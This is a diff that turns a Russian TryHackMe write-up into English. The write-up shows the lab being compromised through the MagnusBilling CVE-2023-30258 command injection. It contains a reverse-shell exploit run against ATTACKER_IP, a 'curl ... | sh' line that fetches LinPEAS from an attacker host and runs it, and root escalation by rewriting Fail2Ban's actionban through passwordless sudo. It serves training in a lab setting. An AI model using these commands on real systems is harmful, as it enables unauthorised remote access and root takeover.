@@ -1,232 +1,236 @@
-**IP**:изменяется из-за разных дней прохождения.
+# Billin Room — TryHackMe
 
-**Общее времяпрепровождения в комнате**: 179 минут.
+> Objective: Gain initial access to the machine, retrieve `user.txt`, then escalate privileges to root and obtain `root.txt`.
 
-# WriteUp: Эксплуатация MagnusBilling (CVE-2023-30258) и повышение привилегий через Fail2Ban.
+# Reconnaissance
 
-> **Цель:** получить первоначальный доступ к машине, извлечь `user.txt`, затем повысить привилегии до `root` и получить `root.txt`.
+We begin with a standard service scan.
 
----
+Bash
 
-# Разведка
-
-Начинаем со стандартного сканирования сервисов.
-
-```bash
+```
 sudo nmap -sS -sV 10.114.188.79
 ```
 
-Результат показал три открытых порта:
+The scan reveals three open ports:
 
-* **22/tcp** — SSH
-* **80/tcp** — Apache HTTP Server
-* **3306/tcp** — MariaDB
+* 22/tcp — SSH
 
-Из интересного:
+* 80/tcp — Apache HTTP Server
 
-* веб-сервер работает на Apache;
-* MariaDB доступна извне, но требует авторизацию;
-* SSH использует OpenSSH 9.2.
+* 3306/tcp — MariaDB
 
-Это говорит о том, что основной вектор атаки, находится на веб-сервере. 
+Interesting findings:
 
----
+* The web server is running Apache.
 
-# Enumeration сервера
+* MariaDB is accessible externally but requires authentication.
 
-Запускаем Gobuster.
+* SSH is running OpenSSH 9.2.
 
-```bash
+This suggests that the web server is the most promising initial attack vector.
+
+# Web Server Enumeration
+
+We start by running Gobuster.
+
+Bash
+
+```
 gobuster dir -w /home/deb88/lists/common.txt -u http://10.114.188.79
 ```
 
-Получаем следующие результаты:
+The following results are returned:
 
 ```
 /index.php -> ./mbilling
 /robots.txt
 ```
 
-Также обнаружены несколько файлов журналов, однако сервер возвращает `403 Forbidden`, поэтому напрямую получить их содержимое нельзя.
+Several log files are also discovered. However, the server returns `403 Forbidden`, preventing us from accessing their contents directly.
 
-Редирект `/index.php` на `/mbilling` говорит о том, что приложение работает на **MagnusBilling**, поэтому дальнейшее исследование сосредоточено именно на нём. 
+The redirect from `/index.php` to `/mbilling` indicates that the application is running MagnusBilling. Therefore, we focus our further investigation on this application.
 
----
+# Searching for Known Vulnerabilities
 
-# Поиск известных уязвимостей
+We use Nuclei to search for known vulnerabilities.
 
-Запускаем nuclei.
+Bash
 
-```bash
+```
 nuclei -u http://TARGET -severity low,medium,high,critical
 ```
 
-Nuclei обнаруживает:
+Nuclei identifies the following vulnerability:
 
 ```
 CVE-2023-30258
 ```
 
-в файле
+The vulnerable file is:
 
 ```
 /mbilling/lib/icepay/icepay.php
 ```
 
-Критическая RCE-уязвимость в MagnusBilling.
+This is a critical remote code execution (RCE) vulnerability in MagnusBilling.
 
-Она позволяет выполнять команды операционной системы без авторизации посредством инъекции команд через параметр запроса. 
+It allows an attacker to execute operating system commands without authentication through command injection in a request parameter.
 
----
+# Obtaining a Reverse Shell
 
-# Получение Reverse Shell
+We use an existing exploit:
 
-Используем готовый exploit(https://github.com/hadrian3689/magnus_billing_rce/tree/main).
+[https://github.com/hadrian3689/magnus_billing_rce/tree/main](https://github.com/hadrian3689/magnus_billing_rce/tree/main) 
 
-```bash
+Bash
+
+```
 python3 magnus_rce.py \
 -t http://T_IP/mbilling/ \
 -lh ATTACKER_IP \
 -lp 9999
 ```
 
-На своей машине запускаем netcat:
+On our machine, we start a Netcat listener:
 
-```bash
+Bash
+
+```
 nc -lvnp 9999
 ```
 
-После успешной эксплуатации получаем shell:
+After successful exploitation, we obtain a shell:
 
-```text
+```
 asterisk@target:/var/www/html/mbilling/lib/icepay$
 ```
 
-Теперь у нас есть первоначальный доступ от имени пользователя **asterisk**. 
+We now have initial access to the machine as the asterisk user.
 
----
+# Initial System Inspection
 
-# Первичный осмотр системы
+We inspect the filesystem.
 
-Проверяем файловую систему.
+Bash
 
-```bash
+```
 cd /
 ls -la
 ```
 
-Структура системы выглядит стандартно для Debian.
+The system has a standard Debian directory structure.
 
-Далее исследуем домашние каталоги пользователей.
+Next, we investigate the users' home directories.
 
-В каталоге:
+In the following directory:
 
 ```
 /home/magnus
 ```
 
-находим первый флаг.
+we find the first flag:
 
 ```
 user.txt
 ```
 
-Содержимое:
+Its contents are:
 
 ```
 THM{4a6831d5f124b25eefb1e92e0f0da4ca}
 ```
 
+# Searching for Privilege Escalation Methods
 
+To identify potential privilege escalation vectors, we use LinPEAS.
 
----
+On our machine, we start a temporary HTTP server:
 
-# Поиск способа повышения привилегий
+Bash
 
-Для поиска возможных векторов используем LinPEAS.
-
-На своей машине:
-
-```bash
+```
 sudo python3 -m http.server 80
 ```
 
-На целевой:
+On the target machine, we execute:
 
-```bash
+Bash
+
+```
 curl http://ATTACKER_IP/linpeas.sh | sh
 ```
 
-Также можно попробовать получить полноценный интерактивный shell:
+We can also try to obtain a fully interactive shell:
 
-```bash
+Bash
+
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-или
+Alternatively:
 
-```bash
+Bash
+
+```
 script -qc /bin/bash /dev/null
 ```
 
-Однако эти действия сами по себе не дают root-доступ, а только позволяют использовать root в общем(но у меня нету пароля).
+However, these commands do not grant root access by themselves. They only provide a more convenient interactive shell. We still need to find a way to escalate our privileges.
 
----
+# Checking Sudo Permissions
 
-# Проверяем sudo
+The next step is to check which commands the current user is allowed to execute with sudo.
 
-Следующий шаг — посмотреть разрешённые команды.
+Bash
 
-```bash
+```
 sudo -l
 ```
 
-Получаем:
+We get the following result:
 
-```text
+```
 (ALL) NOPASSWD:
 /usr/bin/fail2ban-client
 ```
 
-Это означает следующее.
+This means that the asterisk user can execute the `fail2ban-client` program as root without entering a password.
 
-Пользователь **asterisk** может запускать программу
+This permission is particularly interesting because it may provide a way to escalate privileges.
+
+# What Is Fail2Ban?
+
+Fail2Ban is a security tool designed to protect services against brute-force attacks.
+
+It monitors service log files.
+
+If an IP address repeatedly performs suspicious actions, such as entering an incorrect SSH password, Fail2Ban can temporarily ban that IP address.
+
+Each jail contains several actions.
+
+These actions can include:
+
+* Adding an iptables rule.
+
+* Sending an email notification.
+
+* Executing an external script.
+
+The last option is particularly interesting for our purposes.
+
+# Checking Active Jails
+
+We check which Fail2Ban jails are currently active.
+
+Bash
 
 ```
-fail2ban-client
-```
-
-от имени **root** без ввода пароля.
-Заинтересовало.
-
----
-
-# Что такое Fail2Ban
-
-Fail2Ban —  сервис защиты от перебора паролей.
-
-Он отслеживает журналы сервисов.
-
-Если один IP несколько раз выполняет подозрительные действия (например, неправильный ввод пароля SSH), Fail2Ban помещает этот IP в бан.
-
-Каждый jail содержит несколько действий (**actions**).
-
-В т.ч:
-добавить правило iptables;
-отправить письмо;
-выполнить внешний скрипт.
-
-Именно последнее интересно..
-
----
-
-# Проверяем активные jail
-
-```bash
 sudo fail2ban-client status
 ```
 
-Получаем:
+The output includes:
 
 ```
 sshd
@@ -235,191 +239,218 @@ mbilling_login
 ...
 ```
 
-Это означает, что jail **sshd** существует и активен. 
+This confirms that the sshd jail exists and is active.
 
----
+We can now investigate whether its actions can be modified.
 
-# Эксплуатация Fail2Ban
+# Exploiting Fail2Ban
 
-Используем 2 команды.
+We use two commands to exploit the available sudo permissions.
 
-## Первая команда
+## First Command
 
-```bash
+Bash
+
+```
 sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'"
 ```
 
-Разберём её по частям.
+Let's break this command down.
 
-`sudo fail2ban-client`
+### `sudo fail2ban-client`
 
+Runs `fail2ban-client` with root privileges.
 
-Запускает программу с root-привилегиями.
+This client allows us to modify the configuration of the running Fail2Ban daemon without directly editing its configuration files.
 
-Через него можно изменять конфигурацию работающего демона без редактирования файлов.
+### `set`
 
----
+Changes an existing setting.
 
-`set`
+### `sshd`
 
-Изменить существующую настройку.
+Specifies the jail we want to modify.
 
-`sshd`
+In this case, we are modifying the jail responsible for protecting SSH.
 
-Название jail.
+### `action`
 
-То есть меняется именно правило, отвечающее за защиту SSH.
+Specifies that we are modifying one of the actions associated with this jail.
 
-`action`
+### `iptables-multiport`
 
-Работаем с действиями (actions) данного jail.
+This is the name of the action we want to modify.
 
-`iptables-multiport`
-Название действия.
+Normally, this action executes a command similar to:
 
-Обычно оно выглядит примерно так:
-
-```text
+```
 iptables -I INPUT ...
 ```
 
-То есть блокирует IP через iptables.
+This command adds a firewall rule to block an IP address.
 
- Сейчас меняем именно это действие.
+We are going to replace the command associated with this action.
 
+### `actionban`
 
-`actionban`
+This is the command that Fail2Ban executes when it bans a new IP address.
 
-Это команда, которую Fail2Ban выполняет **при бане нового IP-адреса**.
+By default, it contains a command similar to:
 
-По умолчанию здесь находится что-то вроде:
+Bash
 
-```bash
+```
 iptables -I INPUT ...
 ```
 
- Заменяем её собственной командой:
+We replace it with our own command:
 
-```bash
+Bash
+
+```
 /bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'
 ```
-Где:
+
+Let's examine what this command does.
+
+First:
+
+Bash
 
 ```
 /bin/bash -c
 ```
 
-говорит bash выполнить строку далее.
+tells Bash to execute the command provided as a string.
 
-Далее выполняется
+Next:
 
-```bash
+Bash
+
+```
 cat /root/root.txt
 ```
 
-Поскольку Fail2Ban работает от имени **root**, эта команда тоже выполняется как **root** и может читать файл, который недоступен пользователю `asterisk`.
+reads the contents of `root.txt`.
 
-Полученный текст записывается:
+Since Fail2Ban runs as root, this command is also executed with root privileges. Therefore, it can read a file that is inaccessible to the `asterisk` user.
 
-```bash
+The output is redirected to:
+
+Bash
+
+```
 > /home/root.txt
 ```
 
-То есть создаётся новый файл уже вне каталога `/root`.
+This creates a new file outside the `/root` directory and writes the contents of the original `root.txt` into it.
 
-После этого
+Finally:
 
-```bash
+Bash
+
+```
 chmod 777 /home/root.txt
 ```
 
-делает этот файл доступным абсолютно всем пользователям.
+makes the new file readable, writable, and executable by all users.
 
-Мы **не становитмся root напрямую**, а заставляем root-процесс скопировать содержимое защищённого файла в общедоступное место.
+We do not obtain a root shell directly. Instead, we make a root process copy the contents of a protected file to a publicly accessible location.
 
+# Second Command
 
----
+Now we execute the second command:
 
-# Вторая команда
+Bash
 
-```bash
+```
 sudo fail2ban-client set sshd banip 127.0.0.1
 ```
 
-Именно эта команда запускает выполнение предыдущего механизма.
+This command triggers the mechanism we configured previously.
 
-Она говорит Fail2Ban заблокировать указанный IP.
+It tells Fail2Ban to ban the specified IP address:
 
 ```
 127.0.0.1
 ```
 
-используется просто как произвольный адрес.
+We use this address simply as an arbitrary target for the ban.
 
-Когда выполняется `banip`, Fail2Ban считает, что произошёл новый бан, и автоматически вызывает действие:
+When `banip` is executed, Fail2Ban processes the new ban and automatically invokes the associated action:
 
 ```
 actionban
 ```
 
-Но ранее мы заменили стандартную команду iptables своей.
+However, we have already replaced the default command with our own.
 
-Поэтому вместо добавления правила в firewall запускается:
+As a result, instead of adding a firewall rule, Fail2Ban executes:
 
-```bash
+Bash
+
+```
 /bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'
 ```
 
-уже с правами root.
+This command runs with root privileges.
 
-Эти 2 команды связаны между собой:
+The two commands work together:
 
-1. первая **подменяет действие**, которое должно выполняться при бане;
-2. вторая **искусственно вызывает бан**, тем самым заставляя Fail2Ban выполнить подменённую команду.
+1. The first command replaces the action that Fail2Ban executes when banning an IP address.
 
+2. The second command artificially triggers a ban, causing Fail2Ban to execute our modified action.
 
+# Obtaining the Root Flag
 
----
+After executing the second command, all that remains is to read the newly created file.
 
-# Получение root-флага
+Bash
 
-После выполнения второй команды остаётся прочитать созданный файл.
-
-```bash
+```
 cat /home/root.txt
 ```
 
-В результате получаем содержимое:
+We successfully retrieve the contents:
 
 ```
 THM{33ad5b530e71a172648f424ec23fae60}
 ```
 
-без необходимости получать полноценную root-оболочку.
+We have obtained the root flag without needing to gain access to a fully privileged root shell.
 
----
+# Summary
 
-# Итог
+The exploitation process followed these steps:
 
-Цепочка эксплуатации выглядела следующим образом:
+1. Scanned the target using Nmap.
 
-1. Сканирование Nmap.
-2. Enumeration веб-сервера с Gobuster.
-3. Обнаружение MagnusBilling.
-4. Поиск известных уязвимостей с помощью Nuclei.
-5. Эксплуатация CVE-2023-30258 и получение shell пользователя `asterisk`.
-6. Получение `user.txt`.
-7. Проверка `sudo -l`.
-8. Обнаружение права запускать `fail2ban-client` без пароля.
-9. Подмена `actionban` в jail `sshd`.
-10. Искусственный вызов события `banip`.
-11. Выполнение команды с привилегиями root.
-12. Копирование `root.txt` в доступное место и получение второго флага
+2. Enumerated the web server using Gobuster.
 
-**Ресурсы:** 
-https://juggernaut-sec.com/fail2ban-lpe/
+3. Discovered the MagnusBilling application.
 
-https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
+4. Searched for known vulnerabilities using Nuclei.
 
-https://github.com/hadrian3689/magnus_billing_rce/tree/main
+5. Exploited CVE-2023-30258 to obtain a shell as the `asterisk` user.
 
+6. Retrieved `user.txt`.
+
+7. Checked sudo permissions using `sudo -l`.
+
+8. Discovered permission to execute `fail2ban-client` without a password.
+
+9. Modified the `actionban` command in the `sshd` jail.
+
+10. Triggered a ban event using `banip`.
+
+11. Executed a command with root privileges.
+
+12. Copied `root.txt` to an accessible location and retrieved the second flag.
+
+# Resources
+
+* [https://juggernaut-sec.com/fail2ban-lpe/](https://juggernaut-sec.com/fail2ban-lpe/) 
+
+* [https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/) 
+
+* [https://github.com/hadrian3689/magnus_billing_rce/tree/main](https://github.com/hadrian3689/magnus_billing_rce/tree/main)
